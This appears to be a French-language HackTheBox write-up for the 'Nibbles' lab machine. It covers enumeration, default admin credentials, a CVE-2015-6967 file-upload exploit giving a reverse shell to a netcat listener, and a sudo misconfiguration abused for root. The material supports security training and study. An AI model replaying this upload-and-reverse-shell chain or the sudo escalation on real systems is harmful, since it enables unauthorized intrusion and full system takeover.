---
title: HTB | Nibbles
description: Nibbles is a fairly simple machine, however with the inclusion of a login blacklist, it is a fair bit more challenging to find valid credentials. Luckily, a username can be enumerated and guessing the correct password does not take long for most.
slug: nibbles-htb
date: 2025-01-13 00:00:00+0000
#image: cover.png
categories:
 - HackTheBox
tags:
 - Linux
 - Easy
#weight: 1
---

<table style="border:none; width:100%;">
  <tr>
    <!-- Colonne gauche : logo -->
    <td style="border:none; text-align:center; vertical-align:middle; width:150px;">
      <img src="cover.png" alt="Nibbles cover" width="120">
    </td>
    <td style="border:none; text-align:center; vertical-align:middle;">
      <table style="margin:auto; border-collapse:collapse; border:1px solid #ddd;">
        <thead>
          <tr>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Machine name</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">OS</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">IP</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Difficulty</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Nibbles</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Linux</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">10.10.10.75</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Easy</td>
          </tr>
        </tbody>
      </table>
    </td>
  </tr>
</table>

## Enumeration

### nmap
```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sS -sC -sV -An -p- -vvv 10.10.10.75

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD8ArTOHWzqhwcyAZWc2CmxfLmVVTwfLZf0zhCBREGCpS2WC3NhAKQ2zefCHCU8XTC8hY9ta5ocU+p7S52OGHlaG7HuA5Xlnihl1INNsMX7gpNcfQEYnyby+hjHWPLo4++fAyO/lB8NammyA13MzvJy8pxvB9gmCJhVPaFzG5yX6Ly8OIsvVDk+qVa5eLCIua1E7WGACUlmkEGljDvzOaBdogMQZ8TGBTqNZbShnFH1WsUxBtJNRtYfeeGjztKTQqqj4WD5atU8dqV/iwmTylpE7wdHZ+38ckuYL9dmUPLh4Li2ZgdY6XniVOBGthY5a2uJ2OFp2xe1WS9KvbYjJ/tH
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPiFJd2F35NPKIQxKMHrgPzVzoNHOJtTtM+zlwVfxzvcXPFFuQrOL7X6Mi9YQF9QRVJpwtmV9KAtWltmk3qm4oc=
|   256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC/RjKhT/2YPlCgFQLx+gOXhC6W3A3raTzjlXQMT8Msk
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
```

## Foothold

### nibbleblog
Avec gobuster, on trouve aucun dossier interessant sur le serveur web. Par contre, avec burp on trouve une commentaire indiquant l'existante d'un dossier "nibbleblog"
```bash
HTTP/1.1 200 OK
Date: Sun, 12 Jan 2025 23:30:36 GMT
Server: Apache/2.4.18 (Ubuntu)
Last-Modified: Thu, 28 Dec 2017 20:19:50 GMT
ETag: "5d-5616c3cf7fa77-gzip"
Accept-Ranges: bytes
Vary: Accept-Encoding
Content-Length: 93
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html

<b>Hello world!</b>

<!-- /nibbleblog/ directory. Nothing interesting here! -->
```

### admin.php
En cherchant un peu, on trouve une page de login "admin.php" avec une page login. Avec les creds trouvés sur internet on a:
user: admin
password: nibbles

On accède au dashboard de nibbles

### Arbitrary File Upload - user flag
Sur internet, on trouve uen vuln sur nibbleblog :

Nibbleblog 4.0.3 - Arbitrary File Upload (CVE-2015-6967)

```bash
python3 exploit.py --url http://nibbles.htb/nibbleblog/ -u admin -p nibbles -x shell.php
[+] Login Successful.
[+] Upload likely successfull.
[+] Exploit launched, check for shell.

-----------------------------------------------------------

$ nc -lnvp 1337                       
listening on [any] 1337 ...
connect to [10.10.14.42] from (UNKNOWN) [10.10.10.75] 34102
Linux Nibbles 4.4.0-104-generic #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 04:01:44 up  9:25,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
nibbler
$ env | grep TERM
$ env
APACHE_RUN_DIR=/var/run/apache2
APACHE_PID_FILE=/var/run/apache2/apache2.pid
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
APACHE_LOCK_DIR=/var/lock/apache2
LANG=C
APACHE_RUN_USER=nibbler
APACHE_RUN_GROUP=nibbler
APACHE_LOG_DIR=/var/log/apache2
PWD=/
$ cd /home
$ ls
nibbler
$ cd nibbler
$ ls
personal.zip
user.txt
$ cat user.txt
962b.....e815
```

## Privilege Escalation

### personal.zip
On trouve dans le /home de nibbler un fichier personal.zip avec un fichier vulnerable monitor.sh qui execute une commande en tant que root

### monitor.sh
On peut executer ce fichier en tant que root.
```bash
$ sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```
Il suffit donc de créer un dossier personal/stuff et d'y mettre un script monitor.sh avec un `cat /root/root.txt`. On peut ensuite l'executé avec **sudo** :
```bash
nibbler@Nibbles:/home/nibbler/personal/stuff$ chmod +x monitor.sh 
nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo ./monitor.sh 
4b0a.....a0b8
```

### root shell
Pour plus de défi, j'ouvre un shell en tant que root. En fait, c'était encore plus facile que de faire un cat...
```bash
$ sudo ./monitor.sh 
nibbler@Nibbles:/home/nibbler/personal/stuff# echo "/bin/bash" > monitor.sh
nibbler@Nibbles:/home/nibbler/personal/stuff# sudo ./monitor.sh
root@Nibbles:/home/nibbler/personal/stuff# whoami
root
```